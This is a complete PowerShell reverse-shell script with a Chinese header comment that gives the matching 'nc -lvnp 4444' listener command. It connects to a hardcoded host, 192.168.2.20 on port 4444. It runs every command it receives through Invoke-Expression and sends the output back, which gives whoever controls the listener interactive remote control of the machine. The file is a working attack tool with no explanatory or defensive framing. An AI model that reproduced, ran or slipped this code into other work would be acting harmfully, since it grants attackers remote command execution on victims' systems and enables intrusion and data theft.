# reverse_shell.ps1 —— 反向 shell（跳板监听: nc -lvnp 4444）
param([string]$LHOST='192.168.2.20',[int]$LPORT=4444)
$c = New-Object Net.Sockets.TCPClient($LHOST,$LPORT)
$s = $c.GetStream()
$b = New-Object byte[] 65536
$enc = New-Object Text.ASCIIEncoding
while (($i = $s.Read($b,0,$b.Length)) -ne 0) {
    $d = $enc.GetString($b,0,$i).Trim()
    if ($d -eq 'exit') { break }
    try { $r = (iex $d 2>&1 | Out-String) } catch { $r = $_.Exception.Message }
    $out = $r + "PS> "
    $sb = $enc.GetBytes($out)
    $s.Write($sb,0,$sb.Length); $s.Flush()
}
$c.Close()
